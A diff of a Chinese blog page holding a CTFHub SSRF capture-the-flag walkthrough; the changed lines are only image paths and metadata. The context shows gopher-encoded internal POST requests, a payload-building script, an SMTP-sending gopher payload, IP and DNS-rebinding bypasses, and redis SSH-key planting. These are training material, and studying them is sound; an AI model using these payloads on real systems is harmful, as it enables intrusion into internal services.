@@ -219,7 +219,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-06-26 21:50:47" itemprop="dateModified" datetime="2023-06-26T21:50:47+08:00">2023-06-26</time>
+      <time title="修改时间：2023-06-26 21:59:15" itemprop="dateModified" datetime="2023-06-26T21:59:15+08:00">2023-06-26</time>
     </span>
 
   
@@ -229,7 +229,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>8.5k</span>
+      <span>8.4k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -287,13 +287,13 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>http访问并抓包</p>
-<p>![](ctfhubssrf.assets&#x2F;CTFhub ssrf的前置知识.png)</p>
+<p>![](ctfhubssrf&#x2F;CTFhub ssrf的前置知识.png)</p>
 <p>get型的http数据包如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /testg.php?name=xxx HTTP/1.1</span><br><span class="line">Host: 10.211.55.2</span><br></pre></td></tr></table></figure>
 
 <p>直接在Burpsuite 中将数据进行编码（比较方便）</p>
 <p>编码的时候在最后一定要补%0d%0a代表结束。</p>
-<p><img src="/ctfhubssrf.assets/CTFhub%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%862.png"></p>
+<p><img src="/ctfhubssrf/CTFhub%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%862.png"></p>
 <p>Burpsuite编码后</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%47%45%54%20%2f%74%65%73%74%67%2e%70%68%70%3f%6e%61%6d%65%3d%78%78%78%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32</span><br></pre></td></tr></table></figure>
 
@@ -305,7 +305,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>我们用gopher协议传递POST请求时，必须要包含这四个，还有一个post传参。</p>
-<p>![](ctfhubssrf.assets&#x2F;CTFhub ssrf前置知识3.png)</p>
+<p>![](ctfhubssrf&#x2F;CTFhub ssrf前置知识3.png)</p>
 <p>转换为gopher</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://10.211.55.2:80/_%50%4f%53%54%20%2f%74%65%73%74%67%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%38%0d%0a%0d%0a%6e%61%6d%65%3d%78%78%78%0d%0a</span><br></pre></td></tr></table></figure>
 
@@ -319,7 +319,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
 
 <p>就得到了flag.</p>
-<p>![](ctfhubssrf.assets&#x2F;CTFhub ssrf的内网访问解题截图.png)</p>
+<p>![](ctfhubssrf&#x2F;CTFhub ssrf的内网访问解题截图.png)</p>
 <h2 id="ctfhub-ssrf的伪协议读取文件"><a href="#ctfhub-ssrf的伪协议读取文件" class="headerlink" title="ctfhub ssrf的伪协议读取文件"></a>ctfhub ssrf的伪协议读取文件</h2><p>老规矩，题目里有提示：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尝试去读取一下Web目录下的flag.php吧</span><br></pre></td></tr></table></figure>
 
@@ -332,10 +332,10 @@
 <h2 id="ctfhub-ssrf的端口扫描"><a href="#ctfhub-ssrf的端口扫描" class="headerlink" title="ctfhub ssrf的端口扫描"></a>ctfhub ssrf的端口扫描</h2><p>题目提示让我们扫描8000到9000端口的，所以在这里就用burpsuite来爆破一下，在参数里随便写一个端口，转到burp</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1:8727</span><br></pre></td></tr></table></figure>
 
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf的端口扫描.png)</p>
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf的端口扫描解题截图2.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf的端口扫描.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf的端口扫描解题截图2.png)</p>
 <p>设置增量为1，范围是8000到9000，如果觉得爆破太慢，可以在选项里调线程数，根据长度找到我们要找的端口，在浏览器进行访问就得到了flag</p>
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf的端口扫描解题截图3.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf的端口扫描解题截图3.png)</p>
 <h2 id="ctfhub-ssrf的POST请求"><a href="#ctfhub-ssrf的POST请求" class="headerlink" title="ctfhub ssrf的POST请求"></a>ctfhub ssrf的POST请求</h2><p>302跳转的302是状态码</p>
 <p>表示请求的网页自请求的网页移动到了新的位置，搜索引擎索引中保存原来的URL</p>
 <p>这里可以通过访问302.php，并且传参gopher来伪造本地访问</p>
@@ -346,9 +346,9 @@
 <p>我们来看看Gopher协议的基本协议格式</p>
 <p>gopher:&#x2F;&#x2F;:&#x2F;_后接TCP数据流</p>
 <p>题目页面空白，尝试访问127.0.0.1&#x2F;flag.php</p>
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf的POST请求解题截图.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf的POST请求解题截图.png)</p>
 <p>有一个搜索框，f12查看源码发现：</p>
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf的POST请求解题截图2.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf的POST请求解题截图2.png)</p>
 <p>发现了key，将其中的值放到输入框，按下回车</p>
 <p>显示只能从127.0.0.1访问，用file:&#x2F;&#x2F;伪协议访问一下index.php和flag.php，在f12里发现源码</p>
 <p>index.php,</p>
@@ -369,7 +369,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">payload =\</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=e297679320b3831c12537c0a981d5055</span><br><span class="line">&quot;&quot;&quot;  </span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="line">result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line">print(result)       # 因为是GET请求所以要进行两次url编码</span><br></pre></td></tr></table></figure>
 
 <p>将跑出来的值在index.php下提交给url即可（因为index.php源码里说到可以url传参）</p>
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf的POST请求解题截图3.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf的POST请求解题截图3.png)</p>
 <h2 id="ctfhub-ssrf的上传文件"><a href="#ctfhub-ssrf的上传文件" class="headerlink" title="ctfhub ssrf的上传文件"></a>ctfhub ssrf的上传文件</h2><p>题目提示：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次需要上传一个文件到flag.php</span><br></pre></td></tr></table></figure>
 
@@ -380,16 +380,16 @@
 <p>提示我们只允许从内网访问，否则会被拦截，同时我们发现前端并没有提交按钮，所以需要在前端代码中添加以下代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf的文件上传解题截图.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf的文件上传解题截图.png)</p>
 <p>这样就搞定了</p>
 <p>随便上传一个文件，得到如下图：</p>
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf的文件上传解题截图2.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf的文件上传解题截图2.png)</p>
 <p>只允许从本地访问，抓包</p>
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf文件上传解题截图3.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf文件上传解题截图3.png)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们把host那里改成127.0.0.1:80</span><br><span class="line">，然后复制，然后就是老操作了，url编码一次，把%0A换成%0D%0A，然后再url编码两次：</span><br></pre></td></tr></table></figure>
 
 <p>然后进行gopher协议的使用，就可以成功得到flag:</p>
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf文件上传解题截图4-16867103154666.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf文件上传解题截图4-16867103154666.png)</p>
 <h2 id="ctfhub-ssrf的URLbypass"><a href="#ctfhub-ssrf的URLbypass" class="headerlink" title="ctfhub ssrf的URLbypass"></a>ctfhub ssrf的URLbypass</h2><p>这里就烁一下关于ssrf的绕过方式</p>
 <p>1.攻击本地</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://localhost:22</span><br></pre></td></tr></table></figure>
@@ -430,7 +430,7 @@
 <p>LDAP:&#x2F;&#x2F;</p>
 <p>ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit</p>
 <p>Gopher:&#x2F;&#x2F;</p>
-<p>ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25&#x2F;xHELO%20localhost%250d%250aMAIL%20FROM%3A%<a href="mailto:&#51;&#67;&#104;&#x61;&#x63;&#107;&#101;&#114;&#64;&#115;&#105;&#116;&#101;&#46;&#x63;&#111;&#109;">&#51;&#67;&#104;&#x61;&#x63;&#107;&#101;&#114;&#64;&#115;&#105;&#116;&#101;&#46;&#x63;&#111;&#109;</a>%3E%250d%250aRCPT%20TO%3A%<a href="mailto:&#51;&#x43;&#118;&#105;&#99;&#116;&#105;&#x6d;&#64;&#115;&#105;&#x74;&#101;&#x2e;&#99;&#x6f;&#109;">&#51;&#x43;&#118;&#105;&#99;&#116;&#105;&#x6d;&#64;&#115;&#105;&#x74;&#101;&#x2e;&#99;&#x6f;&#109;</a>%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%<a href="mailto:&#x33;&#67;&#x68;&#x61;&#99;&#x6b;&#101;&#114;&#x40;&#115;&#105;&#116;&#x65;&#x2e;&#99;&#111;&#109;">&#x33;&#67;&#x68;&#x61;&#99;&#x6b;&#101;&#114;&#x40;&#115;&#105;&#116;&#x65;&#x2e;&#99;&#111;&#109;</a>%3E%250d%250aTo%3A%20%<a href="mailto:&#x33;&#67;&#118;&#105;&#x63;&#116;&#x69;&#x6d;&#101;&#x40;&#x73;&#x69;&#x74;&#x65;&#46;&#99;&#111;&#x6d;">&#x33;&#67;&#118;&#105;&#x63;&#116;&#x69;&#x6d;&#101;&#x40;&#x73;&#x69;&#x74;&#x65;&#46;&#99;&#111;&#x6d;</a>%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</p>
+<p>ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25&#x2F;xHELO%20localhost%250d%250aMAIL%20FROM%3A%<a href="mailto:&#x33;&#x43;&#x68;&#97;&#x63;&#107;&#101;&#x72;&#x40;&#115;&#x69;&#116;&#x65;&#46;&#x63;&#111;&#x6d;">&#x33;&#x43;&#x68;&#97;&#x63;&#107;&#101;&#x72;&#x40;&#115;&#x69;&#116;&#x65;&#46;&#x63;&#111;&#x6d;</a>%3E%250d%250aRCPT%20TO%3A%<a href="mailto:&#x33;&#x43;&#x76;&#x69;&#99;&#x74;&#x69;&#109;&#x40;&#115;&#x69;&#116;&#101;&#46;&#x63;&#x6f;&#x6d;">&#x33;&#x43;&#x76;&#x69;&#99;&#x74;&#x69;&#109;&#x40;&#115;&#x69;&#116;&#101;&#46;&#x63;&#x6f;&#x6d;</a>%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%<a href="mailto:&#x33;&#67;&#104;&#x61;&#x63;&#107;&#101;&#114;&#x40;&#x73;&#x69;&#x74;&#x65;&#x2e;&#x63;&#x6f;&#109;">&#x33;&#67;&#104;&#x61;&#x63;&#107;&#101;&#114;&#x40;&#x73;&#x69;&#x74;&#x65;&#x2e;&#x63;&#x6f;&#109;</a>%3E%250d%250aTo%3A%20%<a href="mailto:&#51;&#x43;&#118;&#x69;&#99;&#116;&#105;&#109;&#101;&#64;&#x73;&#x69;&#x74;&#101;&#x2e;&#x63;&#x6f;&#109;">&#51;&#x43;&#118;&#x69;&#99;&#116;&#105;&#109;&#101;&#64;&#x73;&#x69;&#x74;&#101;&#x2e;&#x63;&#x6f;&#109;</a>%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</p>
 <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>题目有一个提示说是：</p>
 <p>请求的URL中必须包含<a target="_blank" rel="noopener" href="http://notfound.ctfhub.com,来尝试利用url的一些特殊地方绕过这个限制吧/">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p>
 <p>直接构造payload:</p>
@@ -440,11 +440,11 @@
 <h2 id="ctfhub-ssrf的数字IP-Bypass"><a href="#ctfhub-ssrf的数字IP-Bypass" class="headerlink" title="ctfhub ssrf的数字IP Bypass"></a>ctfhub ssrf的数字IP Bypass</h2><p>题目给了hint</p>
 <p>这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p>
 <p>告诉我们不能用十进制了</p>
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf的数字IP bypasss接替截图.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf的数字IP bypasss接替截图.png)</p>
 <p>因为不能用十进制，所以我们试一下十六进制可不可以，127.0.0.1转换为十六进制是0x7F000001,访问就拿到了flag。</p>
 <h2 id="ctfhub-ssrf的302by-pass"><a href="#ctfhub-ssrf的302by-pass" class="headerlink" title="ctfhub ssrf的302by pass"></a>ctfhub ssrf的302by pass</h2><p>SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p>
 <p>还是先试一下127.0.0.1&#x2F;flag.php，访问一下，返回如下：</p>
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf的302 bypass解题截图.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf的302 bypass解题截图.png)</p>
 <p>接下来就是试一试URL bypass提到的绕过方式吗，发现直接替换成localhost就成功了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=localhost/flag.php</span><br></pre></td></tr></table></figure>
 
@@ -452,7 +452,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
 
 <p>使用题目所给链接。到DNS重绑定的一个工具里</p>
-<p>![](ctfhubssrf.assets&#x2F;ctfhub ssrf的DNS重绑定解题截图.png)</p>
+<p>![](ctfhubssrf&#x2F;ctfhub ssrf的DNS重绑定解题截图.png)</p>
 <p>将那个7f000001.7f000002.rbndr.us替换127.0.0.1构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=7f000001.7f000002.rbndr.us/flag.php</span><br></pre></td></tr></table></figure>
 
@@ -628,7 +628,7 @@
 <p>在这里输入你自己生成的私钥即可</p>
 <p><strong>注意：</strong></p>
 <p><strong>1.如果你是linux系统使用cat,是windows系统使用type.</strong></p>
-<p><strong>2.如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa <a href="mailto:&#114;&#111;&#111;&#116;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x34;&#x33;&#46;&#49;&#52;&#x31;">&#114;&#111;&#111;&#116;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x34;&#x33;&#46;&#49;&#52;&#x31;</a>需要在.ssh目录下，因为权限问题。</strong></p>
+<p><strong>2.如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x34;&#51;&#46;&#49;&#52;&#49;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x34;&#51;&#46;&#49;&#52;&#49;</a>需要在.ssh目录下，因为权限问题。</strong></p>
 <p><strong>3.你利用redis上传公钥时候运行代码是在你解压的redis文件下运行。</strong></p>
 <p><strong>4.文件名必须是authorized_keys,由配置文件决定的。</strong></p>
 <h3 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h3><h4 id="什么是crontab"><a href="#什么是crontab" class="headerlink" title="什么是crontab"></a>什么是crontab</h4><p>crontab 是一个在类 Unix 系统中定时执行任务的命令，它允许用户在指定的时间点或时间间隔内运行命令或脚本。通常情况下，crontab 命令用于自动化重复性任务，如备份、数据同步、清理日志等。</p>
@@ -1113,7 +1113,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">19k</span>
+    <span title="站点总字数">18k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
